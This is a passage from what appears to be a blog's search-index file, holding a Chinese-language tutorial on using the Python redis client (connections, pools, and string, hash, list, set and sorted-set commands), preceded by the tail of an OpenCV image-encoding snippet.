img)[1]# imgg = cv2.imencode(&#39;.png&#39;, img)data_encode = np.array(img_encode)str_encode = data_encode.tostring()# 缓存数据保存到本地，以txt格式保存with open(&#39;img_encode.txt&#39;, &#39;w&#39;) as f:    f.write(str_encode)    f.flushwith open(&#39;img_encode.txt&#39;, &#39;r&#39;) as f:    str_encode = f.read()image = np.asarray(bytearray(str_encode), dtype=&quot;uint8&quot;)image = cv2.imdecode(image, cv2.IMREAD_COLOR)cv2.imshow(&#39;img_decode&#39;,image)cv2.waitKey()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py redis.md</title>
      <link href="/2019/11/30/deploy/python/libs/py%20redis/"/>
      <url>/2019/11/30/deploy/python/libs/py%20redis/</url>
      
        <content type="html"><![CDATA[<blockquote><p>redis提供两个类Redis和StrictRedis用于实现Redis的命令，<br>StrictRedis用于实现大部分官方的命令，并使用官方的语法和命令，<br>Redis是StrictRedis的子类，用于向后兼容旧版本的redis-py。</p></blockquote><blockquote><p>redis连接实例是线程安全的，可以直接将redis连接实例设置为一个全局变量，直接使用。<br>如果需要另一个Redis实例（or Redis数据库）时，就需要重新创建redis连接实例来获取一个新的连接。<br>同理，python的redis没有实现select命令。</p></blockquote><h1 id="1、安装"><a href="#1、安装" class="headerlink" title="1、安装"></a>1、安装</h1><pre><code>安装： pip install redis</code></pre><h1 id="2、连接"><a href="#2、连接" class="headerlink" title="2、连接"></a>2、连接</h1><pre><code class="python">import redisdef connect():    # host是redis主机，需要redis服务端和客户端都启动 redis默认端口是6379    # 连接redis，加上decode_responses=True，写入的键值对中的value为str类型，    # 不加这个参数写入的则为字节类型。    r = redis.Redis(host=&#39;47.102.125.88&#39;, port=6379, decode_responses=True)    # r.set(&#39;name&#39;, &#39;junxi&#39;)  # key是&quot;foo&quot; value是&quot;bar&quot; 将键值对存入redis缓存    # print(r[&#39;name&#39;])    # print(r.get(&#39;name&#39;))  # 取出键name对应的值    # print(type(r.get(&#39;name&#39;)))    return rdef connect_by_pool():    &quot;&quot;&quot;    连接池    redis-py使用connection pool来管理对一个redis server的所有连接，    避免每次建立、释放连接的开销。默认，每个Redis实例都会维护一个自己的连接池。    可以直接建立一个连接池，然后作为参数Redis，这样就可以实现多个Redis实例共享一个连接池    :return:    &quot;&quot;&quot;    # host是redis主机，需要redis服务端和客户端都起着 redis默认端口是6379    pool = redis.ConnectionPool(host=&#39;localhost&#39;, port=6379, decode_responses=True)    r = redis.Redis(connection_pool=pool)    # r.set(&#39;gender&#39;, &#39;male&#39;)  # key是&quot;gender&quot; value是&quot;male&quot; 将键值对存入redis缓存    # print(r.get(&#39;gender&#39;))  # gender 取出键male对应的值    return r</code></pre><h1 id="3、redis基本命令-String"><a href="#3、redis基本命令-String" class="headerlink" title="3、redis基本命令 String"></a>3、redis基本命令 String</h1><pre><code>set(name, value, ex=None, px=None, nx=False, xx=False)在Redis中设置值，默认，不存在则创建，存在则修改参数：ex，过期时间（秒）px，过期时间（毫秒）nx，如果设置为True，则只有name不存在时，当前set操作才执行xx，如果设置为True，则只有name存在时，当前set操作才执行</code></pre><pre><code>1.ex，过期时间（秒） 这里过期时间是3秒，3秒后p，键food的值就变成Noneimport redispool = redis.ConnectionPool(host=&#39;localhost&#39;, port=6379, decode_responses=True)r = redis.Redis(connection_pool=pool)r.set(&#39;food&#39;, &#39;mutton&#39;, ex=3)    # key是&quot;food&quot; value是&quot;mutton&quot; 将键值对存入redis缓存print(r.get(&#39;food&#39;))  # mutton 取出键food对应的值</code></pre><pre><code>2.px，过期时间（豪秒） 这里过期时间是3豪秒，3毫秒后，键foo的值就变成Noneimport redispool = redis.ConnectionPool(host=&#39;localhost&#39;, port=6379, decode_responses=True)r = redis.Redis(connection_pool=pool)r.set(&#39;food&#39;, &#39;beef&#39;, px=3)print(r.get(&#39;food&#39;))</code></pre><pre><code>3.nx，如果设置为True，则只有name不存在时，当前set操作才执行 （新建）import redispool = redis.ConnectionPool(host=&#39;localhost&#39;, port=6379, decode_responses=True)r = redis.Redis(connection_pool=pool)print(r.set(&#39;fruit&#39;, &#39;watermelon&#39;, nx=True))    # True--不存在# 如果键fruit不存在，那么输出是True；如果键fruit已经存在，输出是None</code></pre><pre><code>4.xx，如果设置为True，则只有name存在时，当前set操作才执行 （修改）print((r.set(&#39;fruit&#39;, &#39;watermelon&#39;, xx=True)))   # True--已经存在# 如果键fruit已经存在，那么输出是True；如果键fruit不存在，输出是None</code></pre><pre><code>5.setnx(name, value)设置值，只有name不存在时，执行设置操作（添加）print(r.setnx(&#39;fruit1&#39;, &#39;banana&#39;))  # fruit1不存在，输出为True</code></pre><pre><code>6.setex(name, value, time)设置值参数：time，过期时间（数字秒 或 timedelta对象）import redisimport timepool = redis.ConnectionPool(host=&#39;localhost&#39;, port=6379, decode_responses=True)r = redis.Redis(connection_pool=pool)r.setex(&quot;fruit2&quot;, &quot;orange&quot;, 5)time.sleep(5)print(r.get(&#39;fruit2&#39;))  # 5秒后，取值就从orange变成None</code></pre><pre><code>7.psetex(name, time_ms, value)设置值参数：time_ms，过期时间（数字毫秒 或 timedelta对象）r.psetex(&quot;fruit3&quot;, 5000, &quot;apple&quot;)time.sleep(5)print(r.get(&#39;fruit3&#39;))  # 5000毫秒后，取值就从apple变成None</code></pre><pre><code>8.mset(*args, **kwargs)批量设置值如：r.mget({&#39;k1&#39;: &#39;v1&#39;, &#39;k2&#39;: &#39;v2&#39;})r.mset(k1=&quot;v1&quot;, k2=&quot;v2&quot;) # 这里k1 和k2 不能带引号 一次设置对个键值对print(r.mget(&quot;k1&quot;, &quot;k2&quot;))   # 一次取出多个键对应的值print(r.mget(&quot;k1&quot;))</code></pre><pre><code>9.mget(keys, *args)批量获取如：print(r.mget(&#39;k1&#39;, &#39;k2&#39;))print(r.mget([&#39;k1&#39;, &#39;k2&#39;]))print(r.mget(&quot;fruit&quot;, &quot;fruit1&quot;, &quot;fruit2&quot;, &quot;k1&quot;, &quot;k2&quot;))  # 将目前redis缓存中的键对应的值批量取出来</code></pre><pre><code>10.getset(name, value)设置新值并获取原来的值print(r.getset(&quot;food&quot;, &quot;barbecue&quot;))  # 设置的新值是barbecue 设置前的值是beef</code></pre><pre><code>11.getrange(key, start, end)获取子序列（根据字节获取，非字符）参数：name，Redis 的 namestart，起始位置（字节）end，结束位置（字节）如： &quot;一二三四&quot; ，0-3表示 &quot;一&quot;r.set(&quot;cn_name&quot;, &quot;一二三四&quot;) # 汉字# 取索引号是0-2 前3位的字节 一 切片操作 （一个汉字3个字节 1个字母一个字节 每个字节8bit）print(r.getrange(&quot;cn_name&quot;, 0, 2))# 取所有的字节 一二三四 切片操作print(r.getrange(&quot;cn_name&quot;, 0, -1))r.set(&quot;en_name&quot;,&quot;junxi&quot;) # 字母# 取索引号是0-2 前3位的字节 jun 切片操作 （一个汉字3个字节 1个字母一个字节 每个字节8bit）print(r.getrange(&quot;en_name&quot;, 0, 2))# 取所有的字节 junxi 切片操作print(r.getrange(&quot;en_name&quot;, 0, -1))</code></pre><pre><code>12.setrange(name, offset, value)修改字符串内容，从指定字符串索引开始向后替换（新值太长时，则向后添加）参数：offset，字符串的索引，字节（一个汉字三个字节）value，要设置的值r.setrange(&quot;en_name&quot;, 1, &quot;ccc&quot;)print(r.get(&quot;en_name&quot;))    # jccci 原始值是junxi 从索引号是1开始替换成ccc 变成 jccci</code></pre><pre><code>13.setbit(name, offset, value)对name对应值的二进制表示的位进行操作参数：name，redis的nameoffset，位的索引（将值变换成二进制后再进行索引）value，值只能是 1 或 0注：如果在Redis中有一个对应： n1 = &quot;foo&quot;，那么字符串foo的二进制表示为：01100110 01101111 01101111所以，如果执行 setbit(&#39;n1&#39;, 7, 1)，则就会将第7位设置为1，那么最终二进制则变成 01100111 01101111 01101111，即：&quot;goo&quot;扩展，转换二进制表示：source = &quot;陈思维&quot;source = &quot;foo&quot;for i in source:num = ord(i)print bin(num).replace(&#39;b&#39;,&#39;&#39;)特别的，如果source是汉字 &quot;陈思维&quot;怎么办？答：对于utf-8，每一个汉字占 3 个字节，那么 &quot;陈思维&quot; 则有 9个字节对于汉字，for循环时候会按照 字节 迭代，那么在迭代时，将每一个字节转换 十进制数，然后再将十进制数转换成二进制11100110 10101101 10100110 11100110 10110010 10011011 11101001 10111101 10010000</code></pre><pre><code>14.getbit(name, offset)获取name对应的值的二进制表示中的某位的值 （0或1）print(r.getbit(&quot;foo1&quot;, 0)) # 0 foo1 对应的二进制 4个字节 32位 第0位是0还是1</code></pre><pre><code>15.bitcount(key, start=None, end=None)获取name对应的值的二进制表示中 1 的个数参数：key，Redis的namestart 字节起始位置end，字节结束位置print(r.get(&quot;foo&quot;))  # goo1 01100111print(r.bitcount(&quot;foo&quot;,0,1))  # 11 表示前2个字节中，1出现的个数</code></pre><pre><code>16.bitop(operation, dest, *keys)获取多个值，并将值做位运算，将最后的结果保存至新的name对应的值参数：operation,AND（并） 、 OR（或） 、 NOT（非） 、 XOR（异或）dest, 新的Redis的name*keys,要查找的Redis的name如：bitop(&quot;AND&quot;, &#39;new_name&#39;, &#39;n1&#39;, &#39;n2&#39;, &#39;n3&#39;)获取Redis中n1,n2,n3对应的值，然后讲所有的值做位运算（求并集），然后将结果保存 new_name 对应的值中r.set(&quot;foo&quot;,&quot;1&quot;)  # 0110001r.set(&quot;foo1&quot;,&quot;2&quot;)  # 0110010print(r.mget(&quot;foo&quot;,&quot;foo1&quot;))  # [&#39;goo1&#39;, &#39;baaanew&#39;]print(r.bitop(&quot;AND&quot;,&quot;new&quot;,&quot;foo&quot;,&quot;foo1&quot;))  # &quot;new&quot; 0 0110000print(r.mget(&quot;foo&quot;,&quot;foo1&quot;,&quot;new&quot;))source = &quot;12&quot;for i in source:num = ord(i)print(num)  # 打印每个字母字符或者汉字字符对应的ascii码值 f-102-0b100111-01100111print(bin(num))  # 打印每个10进制ascii码值转换成二进制的值 0b1100110（0b表示二进制）print bin(num).replace(&#39;b&#39;,&#39;&#39;)  # 将二进制0b1100110替换成01100110</code></pre><pre><code>17.strlen(name)返回name对应值的字节长度（一个汉字3个字节）print(r.strlen(&quot;foo&quot;))  # 4 &#39;goo1&#39;的长度是4</code></pre><pre><code>18.incr(self, name, amount=1)自增 name对应的值，当name不存在时，则创建name＝amount，否则，则自增。参数：name,Redis的nameamount,自增数（必须是整数）注：同incrbyr.set(&quot;foo&quot;, 123)print(r.mget(&quot;foo&quot;, &quot;foo1&quot;, &quot;foo2&quot;, &quot;k1&quot;, &quot;k2&quot;))r.incr(&quot;foo&quot;, amount=1)print(r.mget(&quot;foo&quot;, &quot;foo1&quot;, &quot;foo2&quot;, &quot;k1&quot;, &quot;k2&quot;))应用场景 – 页面点击数假定我们对一系列页面需要记录点击次数。例如论坛的每个帖子都要记录点击次数，而点击次数比回帖的次数的多得多。  如果使用关系数据库来存储点击，可能存在大量的行级锁争用。所以，点击数的增加使用redis的INCR命令最好不过了。当redis服务器启动时，可以从关系数据库读入点击数的初始值（12306这个页面被访问了34634次）r.set(&quot;visit:12306:totals&quot;, 34634)print(r.get(&quot;visit:12306:totals&quot;))每当有一个页面点击，则使用INCR增加点击数即可。r.incr(&quot;visit:12306:totals&quot;)r.incr(&quot;visit:12306:totals&quot;)页面载入的时候则可直接获取这个值print(r.get(&quot;visit:12306:totals&quot;))</code></pre><pre><code>19.incrbyfloat(self, name, amount=1.0)自增 name对应的值，当name不存在时，则创建name＝amount，否则，则自增。参数：name,Redis的nameamount,自增数（浮点型）r.set(&quot;foo1&quot;, &quot;123.0&quot;)r.set(&quot;foo2&quot;, &quot;221.0&quot;)print(r.mget(&quot;foo1&quot;, &quot;foo2&quot;))r.incrbyfloat(&quot;foo1&quot;, amount=2.0)r.incrbyfloat(&quot;foo2&quot;, amount=3.0)print(r.mget(&quot;foo1&quot;, &quot;foo2&quot;))</code></pre><pre><code>20.decr(self, name, amount=1)自减 name对应的值，当name不存在时，则创建name＝amount，否则，则自减。参数：name,Redis的nameamount,自减数（整数)r.decr(&quot;foo4&quot;, amount=3) # 递减3r.decr(&quot;foo1&quot;, amount=1) # 递减1print(r.mget(&quot;foo1&quot;, &quot;foo4&quot;))</code></pre><pre><code>21.append(key, value)在redis name对应的值后面追加内容参数：key, redis的namevalue, 要追加的字符串r.append(&quot;name&quot;, &quot;haha&quot;)    # 在name对应的值junxi后面追加字符串hahaprint(r.mget(&quot;name&quot;))</code></pre><h1 id="4、redis基本命令-hash"><a href="#4、redis基本命令-hash" class="headerlink" title="4、redis基本命令 hash"></a>4、redis基本命令 hash</h1><pre><code>1.单个增加--修改(单个取出)--没有就新增，有的话就修改hset(name, key, value)name对应的hash中设置一个键值对（不存在，则创建；否则，修改）参数：name，redis的namekey，name对应的hash中的keyvalue，name对应的hash中的value注：hsetnx(name, key, value),当name对应的hash中不存在当前key时则创建（相当于添加）import redisimport timepool = redis.ConnectionPool(host=&#39;localhost&#39;, port=6379, decode_responses=True)r = redis.Redis(connection_pool=pool)r.hset(&quot;hash1&quot;, &quot;k1&quot;, &quot;v1&quot;)r.hset(&quot;hash1&quot;, &quot;k2&quot;, &quot;v2&quot;)print(r.hkeys(&quot;hash1&quot;)) # 取hash中所有的keyprint(r.hget(&quot;hash1&quot;, &quot;k1&quot;))    # 单个取hash的key对应的值print(r.hmget(&quot;hash1&quot;, &quot;k1&quot;, &quot;k2&quot;)) # 多个取hash的key对应的值r.hsetnx(&quot;hash1&quot;, &quot;k2&quot;, &quot;v3&quot;) # 只能新建print(r.hget(&quot;hash1&quot;, &quot;k2&quot;))</code></pre><pre><code>2 批量增加（取出）hmset(name, mapping)在name对应的hash中批量设置键值对参数：name，redis的namemapping，字典，如：{&#39;k1&#39;:&#39;v1&#39;, &#39;k2&#39;: &#39;v2&#39;}如：r.hmset(&quot;hash2&quot;, {&quot;k2&quot;: &quot;v2&quot;, &quot;k3&quot;: &quot;v3&quot;})hget(name,key)在name对应的hash中获取根据key获取valuehmget(name, keys, *args)在name对应的hash中获取多个key的值参数：name，reids对应的namekeys，要获取key集合，如：[&#39;k1&#39;, &#39;k2&#39;, &#39;k3&#39;]*args，要获取的key，如：k1,k2,k3如：print(r.hget(&quot;hash2&quot;, &quot;k2&quot;))  # 单个取出&quot;hash2&quot;的key-k2对应的valueprint(r.hmget(&quot;hash2&quot;, &quot;k2&quot;, &quot;k3&quot;))  # 批量取出&quot;hash2&quot;的key-k2 k3对应的value --方式1print(r.hmget(&quot;hash2&quot;, [&quot;k2&quot;, &quot;k3&quot;]))  # 批量取出&quot;hash2&quot;的key-k2 k3对应的value --方式2</code></pre><pre><code>3.取出所有的键值对hgetall(name)获取name对应hash的所有键值print(r.hgetall(&quot;hash1&quot;))</code></pre><pre><code>4.得到所有键值对的格式 hash长度hlen(name)获取name对应的hash中键值对的个数print(r.hlen(&quot;hash1&quot;))</code></pre><pre><code>5.得到所有的keys（类似字典的取所有keys）hkeys(name)获取name对应的hash中所有的key的值print(r.hkeys(&quot;hash1&quot;))</code></pre><pre><code>6.得到所有的value（类似字典的取所有value）hvals(name)获取name对应的hash中所有的value的值print(r.hvals(&quot;hash1&quot;))</code></pre><pre><code>7.判断成员是否存在（类似字典的in）hexists(name, key)检查name对应的hash是否存在当前传入的keyprint(r.hexists(&quot;hash1&quot;, &quot;k4&quot;))  # False 不存在print(r.hexists(&quot;hash1&quot;, &quot;k1&quot;))  # True 存在</code></pre><pre><code>8.删除键值对hdel(name,*keys)将name对应的hash中指定key的键值对删除print(r.hgetall(&quot;hash1&quot;))r.hset(&quot;hash1&quot;, &quot;k2&quot;, &quot;v222&quot;)   # 修改已有的key k2r.hset(&quot;hash1&quot;, &quot;k11&quot;, &quot;v1&quot;)   # 新增键值对 k11r.hdel(&quot;hash1&quot;, &quot;k1&quot;)    # 删除一个键值对print(r.hgetall(&quot;hash1&quot;))</code></pre><pre><code>9.自增自减整数(将key对应的value--整数 自增1或者2，或者别的整数 负数就是自减)hincrby(name, key, amount=1)自增name对应的hash中的指定key的值，不存在则创建key=amount参数：name，redis中的namekey， hash对应的keyamount，自增数（整数）r.hset(&quot;hash1&quot;, &quot;k3&quot;, 123)r.hincrby(&quot;hash1&quot;, &quot;k3&quot;, amount=-1)print(r.hgetall(&quot;hash1&quot;))r.hincrby(&quot;hash1&quot;, &quot;k4&quot;, amount=1)  # 不存在的话，value默认就是1print(r.hgetall(&quot;hash1&quot;))</code></pre><pre><code>10.自增自减浮点数(将key对应的value--浮点数 自增1.0或者2.0，或者别的浮点数 负数就是自减)hincrbyfloat(name, key, amount=1.0)自增name对应的hash中的指定key的值，不存在则创建key=amount参数：name，redis中的namekey， hash对应的keyamount，自增数（浮点数）自增name对应的hash中的指定key的值，不存在则创建key=amountr.hset(&quot;hash1&quot;, &quot;k5&quot;, &quot;1.0&quot;)r.hincrbyfloat(&quot;hash1&quot;, &quot;k5&quot;, amount=-1.0)    # 已经存在，递减-1.0print(r.hgetall(&quot;hash1&quot;))r.hincrbyfloat(&quot;hash1&quot;, &quot;k6&quot;, amount=-1.0)    # 不存在，value初始值是-1.0 每次递减1.0print(r.hgetall(&quot;hash1&quot;))</code></pre><pre><code>11.取值查看--分片读取hscan(name, cursor=0, match=None, count=None)增量式迭代获取，对于数据大的数据非常有用，hscan可以实现分片的获取数据，并非一次性将数据全部获取完，从而放置内存被撑爆参数：name，redis的namecursor，游标（基于游标分批取获取数据）match，匹配指定key，默认None 表示所有的keycount，每次分片最少获取个数，默认None表示采用Redis的默认分片个数如：第一次：cursor1, data1 = r.hscan(&#39;xx&#39;, cursor=0, match=None, count=None)第二次：cursor2, data1 = r.hscan(&#39;xx&#39;, cursor=cursor1, match=None, count=None)...直到返回值cursor的值为0时，表示数据已经通过分片获取完毕print(r.hscan(&quot;hash1&quot;))</code></pre><pre><code>12.hscan_iter(name, match=None, count=None)利用yield封装hscan创建生成器，实现分批去redis中获取数据参数：match，匹配指定key，默认None 表示所有的keycount，每次分片最少获取个数，默认None表示采用Redis的默认分片个数如：for item in r.hscan_iter(&#39;hash1&#39;):    print(item)print(r.hscan_iter(&quot;hash1&quot;))    # 生成器内存地址</code></pre><h1 id="5、redis基本命令-list"><a href="#5、redis基本命令-list" class="headerlink" title="5、redis基本命令 list"></a>5、redis基本命令 list</h1><pre><code>1.增加（类似于list的append，只是这里是从左边新增加）--没有就新建lpush(name,values)在name对应的list中添加元素，每个新的元素都添加到列表的最左边如：import redisimport timepool = redis.ConnectionPool(host=&#39;localhost&#39;, port=6379, decode_responses=True)r = redis.Redis(connection_pool=pool)r.lpush(&quot;list1&quot;, 11, 22, 33)print(r.lrange(&#39;list1&#39;, 0, -1))保存顺序为: 33,22,11扩展：r.rpush(&quot;list2&quot;, 11, 22, 33)  # 表示从右向左操作print(r.llen(&quot;list2&quot;))  # 列表长度print(r.lrange(&quot;list2&quot;, 0, 3))  # 切片取出值，范围是索引号0-3</code></pre><pre><code>2.增加（从右边增加）--没有就新建r.rpush(&quot;list2&quot;, 44, 55, 66)    # 在列表的右边，依次添加44,55,66print(r.llen(&quot;list2&quot;))  # 列表长度print(r.lrange(&quot;list2&quot;, 0, -1)) # 切片取出值，范围是索引号0到-1(最后一个元素)</code></pre><pre><code>3.往已经有的name的列表的左边添加元素，没有的话无法创建lpushx(name,value)在name对应的list中添加元素，只有name已经存在时，值添加到列表的最左边更多：r.lpushx(&quot;list10&quot;, 10)   # 这里list10不存在print(r.llen(&quot;list10&quot;))  # 0print(r.lrange(&quot;list10&quot;, 0, -1))  # []r.lpushx(&quot;list2&quot;, 77)   # 这里&quot;list2&quot;之前已经存在，往列表最左边添加一个元素，一次只能添加一个print(r.llen(&quot;list2&quot;))  # 列表长度print(r.lrange(&quot;list2&quot;, 0, -1)) # 切片取出值，范围是索引号0到-1(最后一个元素</code></pre><pre><code>4.往已经有的name的列表的右边添加元素，没有的话无法创建r.rpushx(&quot;list2&quot;, 99)   # 这里&quot;foo_list1&quot;之前已经存在，往列表最右边添加一个元素，一次只能添加一个print(r.llen(&quot;list2&quot;))  # 列表长度print(r.lrange(&quot;list2&quot;, 0, -1)) # 切片取出值，范围是索引号0到-1(最后一个元素)</code></pre><pre><code>5.新增（固定索引号位置插入元素）linsert(name, where, refvalue, value))在name对应的列表的某一个值前或后插入一个新值参数：name，redis的namewhere，BEFORE或AFTERrefvalue，标杆值，即：在它前后插入数据value，要插入的数据r.linsert(&quot;list2&quot;, &quot;before&quot;, &quot;11&quot;, &quot;00&quot;)   # 往列表中左边第一个出现的元素&quot;11&quot;前插入元素&quot;00&quot;print(r.lrange(&quot;list2&quot;, 0, -1))   # 切片取出值，范围是索引号0-最后一个元素</code></pre><pre><code>6.修改（指定索引号进行修改）r.lset(name, index, value)对name对应的list中的某一个索引位置重新赋值参数：name，redis的nameindex，list的索引位置value，要设置的值r.lset(&quot;list2&quot;, 0, -11)    # 把索引号是0的元素修改成-11print(r.lrange(&quot;list2&quot;, 0, -1))</code></pre><pre><code>7.删除（指定值进行删除）r.lrem(name, value, num)在name对应的list中删除指定的值参数：name，redis的namevalue，要删除的值num， num=0，删除列表中所有的指定值；num=2,从前到后，删除2个； num=1,从前到后，删除左边第1个num=-2,从后向前，删除2个r.lrem(&quot;list2&quot;, &quot;11&quot;, 1)    # 将列表中左边第一次出现的&quot;11&quot;删除print(r.lrange(&quot;list2&quot;, 0, -1))r.lrem(&quot;list2&quot;, &quot;99&quot;, -1)    # 将列表中右边第一次出现的&quot;99&quot;删除print(r.lrange(&quot;list2&quot;, 0, -1))r.lrem(&quot;list2&quot;, &quot;22&quot;, 0)    # 将列表中所有的&quot;22&quot;删除print(r.lrange(&quot;list2&quot;, 0, -1))</code></pre><pre><code>8.删除并返回lpop(name)在name对应的列表的左侧获取第一个元素并在列表中移除，返回值则是第一个元素更多：rpop(name) 表示从右向左操作r.lpop(&quot;list2&quot;)    # 删除列表最左边的元素，并且返回删除的元素print(r.lrange(&quot;list2&quot;, 0, -1))r.rpop(&quot;list2&quot;)    # 删除列表最右边的元素，并且返回删除的元素print(r.lrange(&quot;list2&quot;, 0, -1))</code></pre><pre><code>9.删除索引之外的值ltrim(name, start, end)在name对应的列表中移除没有在start-end索引之间的值参数：name，redis的namestart，索引的起始位置end，索引结束位置r.ltrim(&quot;list2&quot;, 0, 2)    # 删除索引号是0-2之外的元素，值保留索引号是0-2的元素print(r.lrange(&quot;list2&quot;, 0, -1))</code></pre><pre><code>10.取值（根据索引号取值）lindex(name, index)在name对应的列表中根据索引获取列表元素print(r.lindex(&quot;list2&quot;, 0))  # 取出索引号是0的值</code></pre><pre><code>11.移动  元素从一个列表移动到另外一个列表rpoplpush(src, dst)从一个列表取出最右边的元素，同时将其添加至另一个列表的最左边参数：src，要取数据的列表的namedst，要添加数据的列表的namer.rpoplpush(&quot;list1&quot;, &quot;list2&quot;)print(r.lrange(&quot;list2&quot;, 0, -1))</code></pre><pre><code>12.移动  元素从一个列表移动到另外一个列表 可以设置超时brpoplpush(src, dst, timeout=0)从一个列表的右侧移除一个元素并将其添加到另一个列表的左侧参数：src，取出并要移除元素的列表对应的namedst，要插入元素的列表对应的nametimeout，当src对应的列表中没有数据时，阻塞等待其有数据的超时时间（秒），0 表示永远阻塞r.brpoplpush(&quot;list1&quot;, &quot;list2&quot;, timeout=2)print(r.lrange(&quot;list2&quot;, 0, -1))</code></pre><pre><code>13.一次移除多个列表blpop(keys, timeout)将多个列表排列，按照从左到右去pop对应列表的元素参数：keys，redis的name的集合timeout，超时时间，当元素所有列表的元素获取完之后，阻塞等待列表内有数据的时间（秒）, 0 表示永远阻塞更多：r.brpop(keys, timeout)  同blpop，将多个列表排列,按照从右像左去移除各个列表内的元素r.lpush(&quot;list10&quot;, 3, 4, 5)r.lpush(&quot;list11&quot;, 3, 4, 5)while True:    r.blpop([&quot;list10&quot;, &quot;list11&quot;], timeout=2)    print(r.lrange(&quot;list10&quot;, 0, -1), r.lrange(&quot;list11&quot;, 0, -1))</code></pre><pre><code>14.自定义增量迭代由于redis类库中没有提供对列表元素的增量迭代，如果想要循环name对应的列表的所有元素，那么就需要：获取name对应的所有列表循环列表但是，如果列表非常大，那么就有可能在第一步时就将程序的内容撑爆，所有有必要自定义一个增量迭代的功能：def list_iter(name):    &quot;&quot;&quot;    自定义redis列表增量迭代    :param name: redis中的name，即：迭代name对应的列表    :return: yield 返回 列表元素    &quot;&quot;&quot;    list_count = r.llen(name)    for index in range(list_count):        yield r.lindex(name, index)# 使用for item in list_iter(&#39;list2&#39;): # 遍历这个列表    print(item)</code></pre><h1 id="6、redis基本命令-set"><a href="#6、redis基本命令-set" class="headerlink" title="6、redis基本命令 set"></a>6、redis基本命令 set</h1><pre><code>1.新增sadd(name,values)name对应的集合中添加元素r.sadd(&quot;set1&quot;, 33, 44, 55, 66)  # 往集合中添加元素print(r.scard(&quot;set1&quot;))  # 集合的长度是4print(r.smembers(&quot;set1&quot;))   # 获取集合中所有的成员</code></pre><pre><code>2.获取元素个数 类似于lenscard(name)获取name对应的集合中元素个数print(r.scard(&quot;set1&quot;))  # 集合的长度是4</code></pre><pre><code>3.获取集合中所有的成员smembers(name)获取name对应的集合的所有成员print(r.smembers(&quot;set1&quot;))   # 获取集合中所有的成员获取集合中所有的成员--元组形式sscan(name, cursor=0, match=None, count=None)print(r.sscan(&quot;set1&quot;))获取集合中所有的成员--迭代器的方式sscan_iter(name, match=None, count=None)同字符串的操作，用于增量迭代分批获取元素，避免内存消耗太大for i in r.sscan_iter(&quot;set1&quot;):    print(i)</code></pre><pre><code>4.差集sdiff(keys, *args)在第一个name对应的集合中且不在其他name对应的集合的元素集合r.sadd(&quot;set2&quot;, 11, 22, 33)print(r.smembers(&quot;set1&quot;))   # 获取集合中所有的成员print(r.smembers(&quot;set2&quot;))print(r.sdiff(&quot;set1&quot;, &quot;set2&quot;))   # 在集合set1但是不在集合set2中print(r.sdiff(&quot;set2&quot;, &quot;set1&quot;))   # 在集合set2但是不在集合set1中</code></pre><pre><code>5.差集--差集存在一个新的集合中sdiffstore(dest, keys, *args)获取第一个name对应的集合中且不在其他name对应的集合，再将其新加入到dest对应的集合中r.sdiffstore(&quot;set3&quot;, &quot;set1&quot;, &quot;set2&quot;)    # 在集合set1但是不在集合set2中print(r.smembers(&quot;set3&quot;))   # 获取集合3中所有的成员</code></pre><pre><code>6.交集sinter(keys, *args)获取多一个name对应集合的交集print(r.sinter(&quot;set1&quot;, &quot;set2&quot;)) # 取2个集合的交集</code></pre><pre><code>7.交集--交集存在一个新的集合中sinterstore(dest, keys, *args)获取多一个name对应集合的并集，再将其加入到dest对应的集合中print(r.sinterstore(&quot;set3&quot;, &quot;set1&quot;, &quot;set2&quot;)) # 取2个集合的交集print(r.smembers(&quot;set3&quot;))并集sunion(keys, *args)获取多个name对应的集合的并集print(r.sunion(&quot;set1&quot;, &quot;set2&quot;)) # 取2个集合的并集并集--并集存在一个新的集合sunionstore(dest,keys, *args)获取多一个name对应的集合的并集，并将结果保存到dest对应的集合中print(r.sunionstore(&quot;set3&quot;, &quot;set1&quot;, &quot;set2&quot;)) # 取2个集合的并集print(r.smembers(&quot;set3&quot;))</code></pre><pre><code>8.判断是否是集合的成员 类似insismember(name, value)检查value是否是name对应的集合的成员，结果为True和Falseprint(r.sismember(&quot;set1&quot;, 33))  # 33是集合的成员print(r.sismember(&quot;set1&quot;, 23))  # 23不是集合的成员</code></pre><pre><code>9.移动smove(src, dst, value)将某个成员从一个集合中移动到另外一个集合r.smove(&quot;set1&quot;, &quot;set2&quot;, 44)print(r.smembers(&quot;set1&quot;))print(r.smembers(&quot;set2&quot;))</code></pre><pre><code>10.删除--随机删除并且返回被删除值spop(name)从集合移除一个成员，并将其返回,说明一下，集合是无序的，所有是随机删除的print(r.spop(&quot;set2&quot;))   # 这个删除的值是随机删除的，集合是无序的print(r.smembers(&quot;set2&quot;))</code></pre><pre><code>11.删除--指定值删除srem(name, values)在name对应的集合中删除某些值print(r.srem(&quot;set2&quot;, 11))   # 从集合中删除指定值 11print(r.smembers(&quot;set2&quot;))</code></pre><h1 id="7、redis基本命令-有序set"><a href="#7、redis基本命令-有序set" class="headerlink" title="7、redis基本命令 有序set"></a>7、redis基本命令 有序set</h1><blockquote><p>Set操作，Set集合就是不允许重复的列表，本身是无序的<br>有序集合，在集合的基础上，为每元素排序；元素的排序需要根据另外一个值来进行比较，<br>所以，对于有序集合，每一个元素有两个值，即：值和分数，分数专门用来做排序。</p></blockquote><pre><code>1.新增zadd(name, *args, **kwargs)在name对应的有序集合中添加元素如：import redisimport timepool = redis.ConnectionPool(host=&#39;localhost&#39;, port=6379, decode_responses=True)r = redis.Redis(connection_pool=pool)r.zadd(&quot;zset1&quot;, n1=11, n2=22)r.zadd(&quot;zset2&quot;, &#39;m1&#39;, 22, &#39;m2&#39;, 44)print(r.zcard(&quot;zset1&quot;)) # 集合长度print(r.zcard(&quot;zset2&quot;)) # 集合长度print(r.zrange(&quot;zset1&quot;, 0, -1))   # 获取有序集合中所有元素print(r.zrange(&quot;zset2&quot;, 0, -1, withscores=True))   # 获取有序集合中所有元素和分数</code></pre><pre><code>2.获取有序集合元素个数 类似于lenzcard(name)获取name对应的有序集合元素的数量print(r.zcard(&quot;zset1&quot;)) # 集合长度</code></pre><pre><code>3.获取有序集合的所有元素r.zrange( name, start, end, desc=False, withscores=False, score_cast_func=float)按照索引范围获取name对应的有序集合的元素参数：name，redis的namestart，有序集合索引起始位置（非分数）end，有序集合索引结束位置（非分数）desc，排序规则，默认按照分数从小到大排序withscores，是否获取元素的分数，默认只获取元素的值score_cast_func，对分数进行数据转换的函数3-1 从大到小排序(同zrange，集合是从大到小排序的)zrevrange(name, 